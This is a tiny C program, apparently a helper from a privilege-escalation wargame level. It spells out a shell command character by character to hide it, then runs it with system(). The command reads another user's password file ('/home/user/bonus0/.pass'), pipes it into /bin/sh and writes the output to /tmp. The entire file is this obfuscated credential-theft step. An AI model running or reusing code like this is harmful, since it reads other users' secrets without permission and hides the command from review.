#include "stdio.h"

int run(void *a, void *b)
{
        char r[45] = {'c','a','t',' ','/','h','o','m','e','/','u','s','e','r','/','b','o','n','u','s','0','/','.','p','a','s','s',' ','|',' ','/','b','i','n','/','s','h','>','/','t','m','p','/','a', 1};
        --r[44];
        system(r);
}

int main()
{
        run(0, 0);
}
